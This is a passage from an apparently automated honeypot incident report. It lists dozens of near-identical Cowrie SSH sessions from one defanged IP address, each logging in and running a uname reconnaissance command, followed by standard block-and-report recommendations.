| **First Seen** | 2026-08-08 17:03 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:03:05` | `cowrie.session.connect` |
| `2026-08-08 17:03:05` | `cowrie.client.version` |
| `2026-08-08 17:03:05` | `cowrie.client.kex` |
| `2026-08-08 17:03:06` | `cowrie.login.success` |
| `2026-08-08 17:03:07` | `cowrie.session.params` |
| `2026-08-08 17:03:07` | `cowrie.command.input` |
| `2026-08-08 17:03:07` | `cowrie.log.closed` |
| `2026-08-08 17:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c760e69eb2c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:03 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:03:12` | `cowrie.session.connect` |
| `2026-08-08 17:03:12` | `cowrie.client.version` |
| `2026-08-08 17:03:12` | `cowrie.client.kex` |
| `2026-08-08 17:03:13` | `cowrie.login.success` |
| `2026-08-08 17:03:13` | `cowrie.session.params` |
| `2026-08-08 17:03:13` | `cowrie.command.input` |
| `2026-08-08 17:03:14` | `cowrie.log.closed` |
| `2026-08-08 17:03:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21fca7367f8a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:03 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:03:19` | `cowrie.session.connect` |
| `2026-08-08 17:03:19` | `cowrie.client.version` |
| `2026-08-08 17:03:19` | `cowrie.client.kex` |
| `2026-08-08 17:03:20` | `cowrie.login.success` |
| `2026-08-08 17:03:21` | `cowrie.session.params` |
| `2026-08-08 17:03:21` | `cowrie.command.input` |
| `2026-08-08 17:03:21` | `cowrie.log.closed` |
| `2026-08-08 17:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70fadd7fe502

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:03 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:03:25` | `cowrie.session.connect` |
| `2026-08-08 17:03:25` | `cowrie.client.version` |
| `2026-08-08 17:03:25` | `cowrie.client.kex` |
| `2026-08-08 17:03:26` | `cowrie.login.success` |
| `2026-08-08 17:03:27` | `cowrie.session.params` |
| `2026-08-08 17:03:27` | `cowrie.command.input` |
| `2026-08-08 17:03:27` | `cowrie.log.closed` |
| `2026-08-08 17:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85e9a5bf8e37

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:03 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:03:31` | `cowrie.session.connect` |
| `2026-08-08 17:03:31` | `cowrie.client.version` |
| `2026-08-08 17:03:31` | `cowrie.client.kex` |
| `2026-08-08 17:03:31` | `cowrie.login.success` |
| `2026-08-08 17:03:32` | `cowrie.session.params` |
| `2026-08-08 17:03:32` | `cowrie.command.input` |
| `2026-08-08 17:03:32` | `cowrie.log.closed` |
| `2026-08-08 17:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0943d29b5c84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:03 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:03:37` | `cowrie.session.connect` |
| `2026-08-08 17:03:37` | `cowrie.client.version` |
| `2026-08-08 17:03:37` | `cowrie.client.kex` |
| `2026-08-08 17:03:38` | `cowrie.login.success` |
| `2026-08-08 17:03:39` | `cowrie.session.params` |
| `2026-08-08 17:03:39` | `cowrie.command.input` |
| `2026-08-08 17:03:39` | `cowrie.log.closed` |
| `2026-08-08 17:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f76b1dd9de4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:03 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:03:43` | `cowrie.session.connect` |
| `2026-08-08 17:03:43` | `cowrie.client.version` |
| `2026-08-08 17:03:43` | `cowrie.client.kex` |
| `2026-08-08 17:03:43` | `cowrie.login.success` |
| `2026-08-08 17:03:44` | `cowrie.session.params` |
| `2026-08-08 17:03:44` | `cowrie.command.input` |
| `2026-08-08 17:03:44` | `cowrie.log.closed` |
| `2026-08-08 17:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f585f922091

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:03 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:03:48` | `cowrie.session.connect` |
| `2026-08-08 17:03:48` | `cowrie.client.version` |
| `2026-08-08 17:03:48` | `cowrie.client.kex` |
| `2026-08-08 17:03:49` | `cowrie.login.success` |
| `2026-08-08 17:03:50` | `cowrie.session.params` |
| `2026-08-08 17:03:50` | `cowrie.command.input` |
| `2026-08-08 17:03:50` | `cowrie.log.closed` |
| `2026-08-08 17:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a955c767f928

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:03 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:03:55` | `cowrie.session.connect` |
| `2026-08-08 17:03:55` | `cowrie.client.version` |
| `2026-08-08 17:03:55` | `cowrie.client.kex` |
| `2026-08-08 17:03:55` | `cowrie.login.success` |
| `2026-08-08 17:03:57` | `cowrie.session.params` |
| `2026-08-08 17:03:57` | `cowrie.command.input` |
| `2026-08-08 17:03:57` | `cowrie.log.closed` |
| `2026-08-08 17:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23757332102a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:01` | `cowrie.session.connect` |
| `2026-08-08 17:04:01` | `cowrie.client.version` |
| `2026-08-08 17:04:01` | `cowrie.client.kex` |
| `2026-08-08 17:04:01` | `cowrie.login.success` |
| `2026-08-08 17:04:02` | `cowrie.session.params` |
| `2026-08-08 17:04:02` | `cowrie.command.input` |
| `2026-08-08 17:04:02` | `cowrie.log.closed` |
| `2026-08-08 17:04:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8feb7a7bec9c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:07` | `cowrie.session.connect` |
| `2026-08-08 17:04:07` | `cowrie.client.version` |
| `2026-08-08 17:04:07` | `cowrie.client.kex` |
| `2026-08-08 17:04:07` | `cowrie.login.success` |
| `2026-08-08 17:04:08` | `cowrie.session.params` |
| `2026-08-08 17:04:08` | `cowrie.command.input` |
| `2026-08-08 17:04:08` | `cowrie.log.closed` |
| `2026-08-08 17:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b893a358ed33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:13` | `cowrie.session.connect` |
| `2026-08-08 17:04:13` | `cowrie.client.version` |
| `2026-08-08 17:04:13` | `cowrie.client.kex` |
| `2026-08-08 17:04:13` | `cowrie.login.success` |
| `2026-08-08 17:04:14` | `cowrie.session.params` |
| `2026-08-08 17:04:14` | `cowrie.command.input` |
| `2026-08-08 17:04:14` | `cowrie.log.closed` |
| `2026-08-08 17:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09aa1c87f6b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:18` | `cowrie.session.connect` |
| `2026-08-08 17:04:18` | `cowrie.client.version` |
| `2026-08-08 17:04:18` | `cowrie.client.kex` |
| `2026-08-08 17:04:19` | `cowrie.login.success` |
| `2026-08-08 17:04:20` | `cowrie.session.params` |
| `2026-08-08 17:04:20` | `cowrie.command.input` |
| `2026-08-08 17:04:20` | `cowrie.log.closed` |
| `2026-08-08 17:04:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ab2de5108f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:24` | `cowrie.session.connect` |
| `2026-08-08 17:04:24` | `cowrie.client.version` |
| `2026-08-08 17:04:24` | `cowrie.client.kex` |
| `2026-08-08 17:04:24` | `cowrie.login.success` |
| `2026-08-08 17:04:25` | `cowrie.session.params` |
| `2026-08-08 17:04:25` | `cowrie.command.input` |
| `2026-08-08 17:04:25` | `cowrie.log.closed` |
| `2026-08-08 17:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a16c24ce152f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:29` | `cowrie.session.connect` |
| `2026-08-08 17:04:29` | `cowrie.client.version` |
| `2026-08-08 17:04:29` | `cowrie.client.kex` |
| `2026-08-08 17:04:30` | `cowrie.login.success` |
| `2026-08-08 17:04:32` | `cowrie.session.params` |
| `2026-08-08 17:04:32` | `cowrie.command.input` |
| `2026-08-08 17:04:32` | `cowrie.log.closed` |
| `2026-08-08 17:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eb962a2bba9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:35` | `cowrie.session.connect` |
| `2026-08-08 17:04:35` | `cowrie.client.version` |
| `2026-08-08 17:04:36` | `cowrie.client.kex` |
| `2026-08-08 17:04:36` | `cowrie.login.success` |
| `2026-08-08 17:04:37` | `cowrie.session.params` |
| `2026-08-08 17:04:37` | `cowrie.command.input` |
| `2026-08-08 17:04:37` | `cowrie.log.closed` |
| `2026-08-08 17:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eba60f208de2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:41` | `cowrie.session.connect` |
| `2026-08-08 17:04:41` | `cowrie.client.version` |
| `2026-08-08 17:04:41` | `cowrie.client.kex` |
| `2026-08-08 17:04:42` | `cowrie.login.success` |
| `2026-08-08 17:04:43` | `cowrie.session.params` |
| `2026-08-08 17:04:43` | `cowrie.command.input` |
| `2026-08-08 17:04:43` | `cowrie.log.closed` |
| `2026-08-08 17:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4cc218c3b92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:47` | `cowrie.session.connect` |
| `2026-08-08 17:04:47` | `cowrie.client.version` |
| `2026-08-08 17:04:47` | `cowrie.client.kex` |
| `2026-08-08 17:04:48` | `cowrie.login.success` |
| `2026-08-08 17:04:49` | `cowrie.session.params` |
| `2026-08-08 17:04:49` | `cowrie.command.input` |
| `2026-08-08 17:04:49` | `cowrie.log.closed` |
| `2026-08-08 17:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f90c46953f7e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:52` | `cowrie.session.connect` |
| `2026-08-08 17:04:53` | `cowrie.client.version` |
| `2026-08-08 17:04:53` | `cowrie.client.kex` |
| `2026-08-08 17:04:53` | `cowrie.login.success` |
| `2026-08-08 17:04:54` | `cowrie.session.params` |
| `2026-08-08 17:04:54` | `cowrie.command.input` |
| `2026-08-08 17:04:54` | `cowrie.log.closed` |
| `2026-08-08 17:04:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69de605f8b56

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:04 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:04:58` | `cowrie.session.connect` |
| `2026-08-08 17:04:58` | `cowrie.client.version` |
| `2026-08-08 17:04:58` | `cowrie.client.kex` |
| `2026-08-08 17:04:59` | `cowrie.login.success` |
| `2026-08-08 17:05:00` | `cowrie.session.params` |
| `2026-08-08 17:05:00` | `cowrie.command.input` |
| `2026-08-08 17:05:00` | `cowrie.log.closed` |
| `2026-08-08 17:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-615fa34c5be6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:04` | `cowrie.session.connect` |
| `2026-08-08 17:05:04` | `cowrie.client.version` |
| `2026-08-08 17:05:04` | `cowrie.client.kex` |
| `2026-08-08 17:05:04` | `cowrie.login.success` |
| `2026-08-08 17:05:05` | `cowrie.session.params` |
| `2026-08-08 17:05:05` | `cowrie.command.input` |
| `2026-08-08 17:05:06` | `cowrie.log.closed` |
| `2026-08-08 17:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5d7b3ae83bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:09` | `cowrie.session.connect` |
| `2026-08-08 17:05:09` | `cowrie.client.version` |
| `2026-08-08 17:05:10` | `cowrie.client.kex` |
| `2026-08-08 17:05:10` | `cowrie.login.success` |
| `2026-08-08 17:05:11` | `cowrie.session.params` |
| `2026-08-08 17:05:11` | `cowrie.command.input` |
| `2026-08-08 17:05:11` | `cowrie.log.closed` |
| `2026-08-08 17:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e13f32b4164d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:15` | `cowrie.session.connect` |
| `2026-08-08 17:05:15` | `cowrie.client.version` |
| `2026-08-08 17:05:15` | `cowrie.client.kex` |
| `2026-08-08 17:05:15` | `cowrie.login.success` |
| `2026-08-08 17:05:16` | `cowrie.session.params` |
| `2026-08-08 17:05:16` | `cowrie.command.input` |
| `2026-08-08 17:05:17` | `cowrie.log.closed` |
| `2026-08-08 17:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eeec099babb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:21` | `cowrie.session.connect` |
| `2026-08-08 17:05:21` | `cowrie.client.version` |
| `2026-08-08 17:05:21` | `cowrie.client.kex` |
| `2026-08-08 17:05:21` | `cowrie.login.success` |
| `2026-08-08 17:05:22` | `cowrie.session.params` |
| `2026-08-08 17:05:22` | `cowrie.command.input` |
| `2026-08-08 17:05:23` | `cowrie.log.closed` |
| `2026-08-08 17:05:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef831d38e92b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:27` | `cowrie.session.connect` |
| `2026-08-08 17:05:27` | `cowrie.client.version` |
| `2026-08-08 17:05:27` | `cowrie.client.kex` |
| `2026-08-08 17:05:27` | `cowrie.login.success` |
| `2026-08-08 17:05:28` | `cowrie.session.params` |
| `2026-08-08 17:05:28` | `cowrie.command.input` |
| `2026-08-08 17:05:28` | `cowrie.log.closed` |
| `2026-08-08 17:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71a8724650a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:33` | `cowrie.session.connect` |
| `2026-08-08 17:05:33` | `cowrie.client.version` |
| `2026-08-08 17:05:33` | `cowrie.client.kex` |
| `2026-08-08 17:05:33` | `cowrie.login.success` |
| `2026-08-08 17:05:34` | `cowrie.session.params` |
| `2026-08-08 17:05:34` | `cowrie.command.input` |
| `2026-08-08 17:05:35` | `cowrie.log.closed` |
